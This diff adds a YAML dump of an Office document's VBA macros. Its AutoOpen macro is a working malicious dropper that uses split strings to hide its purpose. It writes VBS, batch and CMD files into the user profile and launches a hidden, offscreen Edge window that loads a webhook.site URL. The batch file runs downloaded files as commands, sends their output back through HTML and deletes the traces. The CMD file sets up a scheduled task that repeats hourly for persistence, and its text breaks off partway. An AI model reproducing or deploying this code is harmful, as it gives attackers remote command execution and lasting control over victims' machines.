@@ -1,0 +1,88 @@
+has_macros: true
+modules:
+  - name: "ThisDocument"
+    type: MODULE_TYPE_CLASS
+    code: |
+        Attribute VB_Name = "ThisDocument"
+        Attribute VB_Base = "1Normal.ThisDocument"
+        Attribute VB_GlobalNameSpace = False
+        Attribute VB_Creatable = False
+        Attribute VB_PredeclaredId = True
+        Attribute VB_Exposed = True
+        Attribute VB_TemplateDerived = True
+        Attribute VB_Customizable = True
+        
+  - name: "Module1"
+    type: MODULE_TYPE_STANDARD
+    code: |
+        Attribute VB_Name = "Module1"
+        Sub AutoOpen()
+        
+        Set FSO = CreateObject("Scripting.FileSystemObject")
+        Set File = FSO.CreateTextFile(CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%userprofile%\68ff1679-974b-4d15-9ce0-799892c63f04") + ".v" + "b" + "s", True)
+        File.Write "Create"
+        File.Write "Object"
+        File.Write "(""WScri"
+        File.Write "pt.shell"").R"
+        File.Write "un """""""" & WScri"
+        File.Write "pt.Arguments(0) & """""""", 0, False"
+        File.Write ""
+        File.Close
+        
+        Set FSO2 = CreateObject("Scripting.FileSystemObject")
+        Set File2 = FSO.CreateTextFile(CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%userprofile%\68ff1679-974b-4d15-9ce0-799892c63f04") + ".b" + "a" + "t", True)
+        File2.WriteLine "@echo off"
+        File2.WriteLine "del /q /f ""%userprofile%\Downloads\*.f04"""
+        File2.WriteLine "del /q /f ""%userprofile%\Downloads\*.tmp"""
+        File2.WriteLine "del /q /f ""%userprofile%\Downloads\*.crdownload"""
+        File2.Write "ta"
+        File2.Write "skkill /f /im mse"
+        File2.WriteLine "dge.exe"
+        File2.Write "start """" mse"
+        File2.Write "dge --window-size=1,1 --window-position=10000,10000 --ignore-certificate-errors "
+        File2.WriteLine "data:text/html;base64,PHNjcmlwdD53aW5kb3cubG9jYXRpb24ucmVwbGFjZSgnaHR0cHM6Ly93ZWJob29rLnNpdGUvNjhmZjE2NzktOTc0Yi00ZDE1LTljZTAtNzk5ODkyYzYzZjA0Jyk8L3NjcmlwdD4="
+        File2.WriteLine "timeout 20"
+        File2.Write "se"
+        File2.WriteLine "t outfile=%random%%random%%random%.f04"
+        File2.Write "typ"
+        File2.Write "e ""%userprofile%\Downloads\*.f04"" >> ""%userprofile%\%outfile%.c"
+        File2.WriteLine "md"""
+        File2.Write "de"
+        File2.WriteLine "l /q /f ""%userprofile%\Downloads\*.f04"""
+        File2.Write "ca"
+        File2.Write "ll ""%userprofile%\%outfile%.c"
+        File2.WriteLine "md"" >> ""%userprofile%\%outfile%"" 2>&1"
+        File2.Write "co"
+        File2.WriteLine "py ""%userprofile%\68ff1679-974b-4d15-9ce0-799892c63f04.htm"" + ""%userprofile%\%outfile%"" + ""%userprofile%\68ff1679-974b-4d15-9ce0-799892c63f04.xhtml"" ""%userprofile%\%outfile%.html"""
+        File2.Write "ta"
+        File2.Write "skkill /f /im mse"
+        File2.WriteLine "dge.exe"
+        File2.Write "start """" mse"
+        File2.Write "dge --window-size=1,1 --window-position=10000,10000 --ignore-certificate-errors "
+        File2.WriteLine """%userprofile%\%outfile%.html"""
+        File2.WriteLine "timeout 20"
+        File2.Write "de"
+        File2.Write "l /q /f ""%userprofile%\%outfile%.c"
+        File2.WriteLine "md"""
+        File2.Write "de"
+        File2.WriteLine "l /q /f ""%userprofile%\%outfile%"""
+        File2.Write "de"
+        File2.WriteLine "l /q /f ""%userprofile%\%outfile%.html"""
+        File2.Write "ta"
+        File2.Write "skkill /f /im mse"
+        File2.WriteLine "dge.exe"
+        File2.Write ""
+        File2.Close
+        
+        Set FSO3 = CreateObject("Scripting.FileSystemObject")
+        Set File3 = FSO.CreateTextFile(CreateObject("Wscript.Shell").ExpandEnvironmentStrings("%userprofile%\68ff1679-974b-4d15-9ce0-799892c63f04") + ".c" + "m" + "d", True)
+        File3.Write "echo ^<?xml version=^""1.0^"" encoding=^""UTF-16^""?^>^<Task version=^""1.2^"" xmlns=^""http://schemas.microsoft.com/windows/2004/02/mit/task^""^>^<RegistrationInfo^>^<Author^>SYSTEM^</Author^>^</RegistrationInfo^>^<Triggers^>^<TimeTrigger^>^<Repetition^>^<Interval^>PT61M^</Interval^>^<StopAtDurationEnd^>false^</StopAtDurationEnd^>^</Repetition^>^<StartBoundary^>2020-05-04T00:20:47^</StartBoundary^>^<Enabled^>true^</Enabled^>^</TimeTrigger^>^</Triggers^>^<Principals^>^<Principal id=^""Author^""^>^<RunLevel^>LeastPrivilege^</RunLevel^>^</Principal^>^</Principals^>^<Settings^>^<MultipleInstancesPolicy^>Parallel^</MultipleInstancesPolicy^>^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>"
+        File3.WriteLine "^<AllowHardTerminate^>true^</AllowHardTerminate^>^<StartWhenAvailable^>true^</StartWhenAvailable^>^<RunOnlyIfNetworkAvailable^>false^</RunOnlyIfNetworkAvailable^>^<IdleSettings^>^<StopOnIdleEnd^>true^</StopOnIdleEnd^>^<RestartOnIdle^>false^</RestartOnIdle^>^</IdleSettings^>^<AllowStartOnDemand^>true^</AllowStartOnDemand^>^<Enabled^>true^</Enabled^>^<Hidden^>false^</Hidden^>^<RunOnlyIfIdle^>false^</RunOnlyIfIdle^>^<WakeToRun^>false^</WakeToRun^>^<ExecutionTimeLimit^>
+project_info:
+    name: "Project"
+    version: "1800149595.7"
+    references:
+      - "stdole"
+      - "Normal"
+      - "Office"
+    module_count: 2
